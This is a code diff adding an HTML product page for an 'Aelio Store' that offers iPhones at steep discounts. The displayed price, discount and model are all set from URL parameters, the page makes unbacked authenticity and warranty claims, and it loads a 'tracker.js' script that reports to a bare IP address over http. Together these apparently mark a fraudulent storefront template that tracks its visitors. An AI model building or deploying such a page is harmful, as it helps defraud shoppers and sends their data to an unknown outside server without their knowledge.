@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Aelio Store — Product</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap');
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{--bg:#000;--s1:#111;--s2:#1c1c1e;--border:rgba(255,255,255,0.1);--text:#f5f5f7;--muted:#86868b;--accent:#2997ff;--green:#30d158}
+body{font-family:'Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
+
+nav{position:fixed;top:0;left:0;right:0;z-index:100;height:48px;background:rgba(0,0,0,0.85);backdrop-filter:blur(20px);border-bottom:0.5px solid var(--border);display:flex;align-items:center;justify-content:center}
+.nav-inner{max-width:1100px;width:100%;padding:0 24px;display:flex;align-items:center;justify-content:space-between}
+.logo{font-size:18px;font-weight:600;color:var(--text);text-decoration:none}
+.nav-back{font-size:13px;color:var(--accent);text-decoration:none;display:flex;align-items:center;gap:4px}
+.nav-back:hover{opacity:.8}
+
+.product{max-width:1000px;margin:0 auto;padding:80px 24px 60px;display:grid;grid-template-columns:1fr 1fr;gap:80px;align-items:start}
+.product-visual{position:sticky;top:80px;text-align:center}
+.product-img{font-size:160px;line-height:1;filter:drop-shadow(0 40px 80px rgba(0,0,0,.8));margin-bottom:24px}
+.product-badge{display:inline-block;font-size:12px;font-weight:600;color:var(--green);background:rgba(48,209,88,.12);border:0.5px solid rgba(48,209,88,.3);border-radius:20px;padding:5px 14px}
+
+.product-info{padding-top:20px}
+.breadcrumb{font-size:12px;color:var(--muted);margin-bottom:16px}
+.breadcrumb a{color:var(--accent);text-decoration:none}
+.product-name{font-size:clamp(28px,4vw,42px);font-weight:300;letter-spacing:-1px;margin-bottom:8px;line-height:1.1}
+.product-sub{font-size:16px;color:var(--muted);margin-bottom:28px}
+
+.price-block{background:var(--s1);border-radius:16px;padding:20px;margin-bottom:24px}
+.price-row{display:flex;align-items:center;justify-content:space-between;margin-bottom:8px}
+.price-row:last-child{margin-bottom:0}
+.price-label{font-size:13px;color:var(--muted)}
+.price-value{font-size:13px;color:var(--muted);text-decoration:line-through}
+.price-main{font-size:32px;font-weight:600}
+.price-save-badge{font-size:12px;font-weight:600;background:rgba(48,209,88,.15);color:var(--green);padding:3px 10px;border-radius:10px}
+
+.specs{margin-bottom:28px}
+.specs-title{font-size:13px;font-weight:500;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:12px}
+.spec-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:0.5px solid var(--border);font-size:14px}
+.spec-row:last-child{border-bottom:none}
+.spec-key{color:var(--muted)}
+
+.order-btn{display:block;width:100%;padding:16px;background:var(--accent);color:#fff;border:none;border-radius:14px;font-size:16px;font-weight:500;font-family:inherit;cursor:pointer;text-align:center;text-decoration:none;transition:background .2s,transform .15s;margin-bottom:10px}
+.order-btn:hover{background:#0077ed;transform:scale(1.01)}
+.order-note{font-size:12px;color:var(--muted);text-align:center;line-height:1.5}
+
+.features{max-width:1000px;margin:0 auto;padding:0 24px 80px}
+.features-title{font-size:22px;font-weight:600;letter-spacing:-0.3px;margin-bottom:20px}
+.features-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:2px}
+.feature{background:var(--s1);padding:24px;border-radius:0}
+.feature:first-child{border-radius:18px 0 0 18px}
+.feature:last-child{border-radius:0 18px 18px 0}
+.feature-icon{font-size:28px;margin-bottom:10px}
+.feature-name{font-size:15px;font-weight:500;margin-bottom:4px}
+.feature-desc{font-size:13px;color:var(--muted);line-height:1.5}
+
+footer{border-top:0.5px solid var(--border);padding:20px 24px;text-align:center;font-size:12px;color:var(--muted)}
+
+@media(max-width:700px){
+  .product{grid-template-columns:1fr;gap:32px}
+  .product-visual{position:static}
+  .product-img{font-size:100px}
+}
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="nav-inner">
+    <a href="catalog.html" class="nav-back">← All iPhones</a>
+    <a href="catalog.html" class="logo">◆ Aelio</a>
+    <div style="width:80px"></div>
+  </div>
+</nav>
+
+<div class="product" id="product-container">
+  <div class="product-visual">
+    <div class="product-img" id="prod-img">📱</div>
+    <div class="product-badge" id="prod-badge">Save 40%</div>
+  </div>
+  <div class="product-info">
+    <div class="breadcrumb"><a href="catalog.html">iPhones</a> › <span id="prod-breadcrumb">iPhone</span></div>
+    <h1 class="product-name" id="prod-name">iPhone</h1>
+    <p class="product-sub" id="prod-sub">Loading...</p>
+
+    <div class="price-block">
+      <div class="price-row">
+        <span class="price-label">Original price</span>
+        <span class="price-value" id="prod-old">$999</span>
+      </div>
+      <div class="price-row">
+        <span class="price-main" id="prod-price">$599</span>
+        <span class="price-save-badge" id="prod-save">Save 40%</span>
+      </div>
+    </div>
+
+    <div class="specs">
+      <div class="specs-title">Specifications</div>
+      <div class="spec-row"><span class="spec-key">Storage</span><span id="spec-storage">128GB</span></div>
+      <div class="spec-row"><span class="spec-key">Color</span><span id="spec-color">Midnight</span></div>
+      <div class="spec-row"><span class="spec-key">Display</span><span id="spec-display">Super Retina XDR</span></div>
+      <div class="spec-row"><span class="spec-key">Chip</span><span id="spec-chip">A16 Bionic</span></div>
+      <div class="spec-row"><span class="spec-key">Camera</span><span id="spec-camera">48MP Main</span></div>
+      <div class="spec-row"><span class="spec-key">Warranty</span><span>1 year included</span></div>
+      <div class="spec-row"><span class="spec-key">Delivery</span><span>3–5 business days</span></div>
+    </div>
+
+    <a href="#" class="order-btn" id="order-btn">Order Now →</a>
+    <p class="order-note">🚚 Free shipping · ↩️ 30-day returns · ✅ Full warranty</p>
+  </div>
+</div>
+
+<div class="features">
+  <div class="features-title">Why Aelio?</div>
+  <div class="features-grid">
+    <div class="feature">
+      <div class="feature-icon">📦</div>
+      <div class="feature-name">Original devices</div>
+      <div class="feature-desc">100% authentic Apple products with serial number verification</div>
+    </div>
+    <div class="feature">
+      <div class="feature-icon">🚚</div>
+      <div class="feature-name">Fast delivery</div>
+      <div class="feature-desc">Shipped within 24 hours. Delivered in 3–5 business days</div>
+    </div>
+    <div class="feature">
+      <div class="feature-icon">✅</div>
+      <div class="feature-name">Full warranty</div>
+      <div class="feature-desc">1-year warranty on every device. Easy returns within 30 days</div>
+    </div>
+    <div class="feature">
+      <div class="feature-icon">💬</div>
+      <div class="feature-name">24/7 support</div>
+      <div class="feature-desc">Our team is always here to help you with any questions</div>
+    </div>
+  </div>
+</div>
+
+<footer>Copyright © 2026 Aelio Store. All rights reserved.</footer>
+
+<script src="/tracker.js" data-server="http://204.168.215.87"></script>
+<script>
+const params = new URLSearchParams(window.location.search);
+const name = params.get('name') || 'iPhone';
+const price = params.get('price') || '599';
+const old = params.get('old') || '999';
+const storage = params.get('storage') || '128GB';
+const color = params.get('color') || 'Midnight';
+const save = params.get('save') || '40';
+const model = params.get('model') || 'iphone15';
+
+document.getElementById('prod-name').textContent = name;
+document.getElementById('prod-breadcrumb').textContent = name;
+document.getElementById('prod-sub').textContent = storage + ' · ' + color;
+document.getElementById('prod-price').textContent = '$' + price;
+document.getElementById('prod-old').textContent = '$' + old;
+document.getElementById('prod-save').textContent = 'Save ' + save + '%';
+document.getElementById('prod-badge').textContent = 'Save ' + save + '%';
+document.getElementById('spec-storage').textContent = storage;
+document.getElementById('spec-color').textContent = color;
+document.title = name + ' — Aelio Store';
+
+// Chip and camera by model
+const specs = {
+  iphone15: {chip:'A16 Bionic', camera:'48MP Main', display:'6.1" Super Retina XDR'},
+  iphone15pro: {chip:'A17 Pro', camera:'48MP Main + 12MP Ultra Wide + 12MP Telephoto', display:'6.1" Super Retina XDR ProMotion'},
+  iphone15promax: {chip:'A17 Pro', camera:'48MP Main + 12MP Ultra Wide + 12MP 5x Telephoto', display:'6.7" Super Retina XDR ProMotion'},
+  iphone16: {chip:'A18', camera:'48MP Fusion + 12MP Ultra Wide', display:'6.1" Super Retina XDR'},
+  iphone16pro: {chip:'A18 Pro', camera:'48MP Fusion + 48MP Ultra Wide + 12MP Telephoto', display:'6.3" Super Retina XDR ProMotion'},
+  iphone16promax: {chip:'A18 Pro', camera:'48MP Fusion + 48MP Ultra Wide + 12MP 5x Telephoto', display:'6.9" Super Retina XDR ProMotion'},
+  iphone17: {chip:'A19', camera:'48MP Fusion + 12MP Ultra Wide', display:'6.1" Super Retina XDR'},
+  iphone17pro: {chip:'A19 Pro', camera:'48MP Fusion + 48MP Ultra Wide + 12MP Telephoto', display:'6.3" Super Retina XDR ProMotion'},
+  iphone17promax: {chip:'A19 Pro', camera:'48MP Fusion + 48MP Ultra Wide + 12MP 5x Telephoto', display:'6.9" Super Retina XDR ProMotion'},
+};
+const s = specs[model] || specs.iphone15;
+document.getElementById('spec-chip').textContent = s.chip;
+document.getElementById('spec-camera').textContent = s.camera;
+document.getElementById('spec-display').textContent = s.display;
+
+// Order button link
+document.getElementById('order-btn').href = 'order.html?name=' + encodeURIComponent(name) + '&price=' + price + '&model=' + model;
+</script>
+</body>
+</html>
